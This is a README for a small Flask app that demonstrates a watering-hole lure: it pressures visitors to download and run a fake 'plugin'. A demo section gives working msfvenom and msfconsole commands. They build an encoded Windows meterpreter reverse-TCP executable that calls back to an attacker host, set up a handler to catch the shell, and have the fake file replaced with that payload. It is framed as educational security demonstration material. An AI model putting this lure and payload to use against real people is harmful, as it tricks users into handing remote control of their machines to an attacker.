# Basic Wateringhole things
## Overview

The Basic Wateringhole things is a simple Flask web application that demonstrates how a malicious file can be disguised as a necessary plugin for viewing website content. The application prompts the user to download a file, simulating a plugin installation, and then redirects the user to a page with a working video.
Installation
Prerequisites

    Python 3.x installed on your system. You can download it from here.

## Installation Steps

1. Clone or download this repository to your local machine.

2. Navigate to the project directory in your terminal or command prompt.

3. Create a virtual environment (optional but recommended):

        python -m venv venv

4. Activate the virtual environment:

    On Linux:

        source venv/bin/activate

    On Windows:

        venv\Scripts\activate

5. Install the required dependencies:

        pip install -r requirements.txt

## Usage
### Running the Application

1. Ensure you are in the project directory with the virtual environment activated.

2. Run the Flask application:

        python run.py

3. Open a web browser and navigate to http://127.0.0.1:5000/.

### Testing

Once the application is running, you will see the homepage with a prompt to download the plugin.

Click on the "Click here to re-download the plugin" link to simulate downloading the plugin.

After the download starts, a prompt will appear asking if you have run the downloaded file. Click "Yes" to proceed to the working video page, or click "No" to wait for the next prompt.

If you clicked "No," another prompt will appear after 10 seconds. Repeat steps 3 and 4 until you click "Yes" or manually close the browser tab.

### For Demo Purposes
I like to use an actual payload to show what this could do if a user was to actually fall for it. To do so, I use msfvenom to generate a simple reverse tcp connection

1. On attack machine: (Replace x.x.x.x with your local IP.....) 
          
       msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=53 -f exe -e x86/shikata_ga_nai -o example.exe
2. Replace fake example.exe in project folder with this payload
3. Run msfconsole and run handler

       msfconsole -q 
       use exploit/multi/handler
       set payload windows/meterpreter/reverse_tcp
       set LHOST <your_local_IP>
       set LPORT 53
       exploit (I actually use run but whatever)
4. Once the victim machine runs the payload, you should receive your shell

### Stopping the Application

To stop the Flask application, simply press Ctrl + C in the terminal or command prompt where the application is running.

## Compatibility

The application has been tested on both Linux and Windows environments.

## Credits

This application was created by rwils83 for educational purposes.

## License

This project is licensed under the MIT License.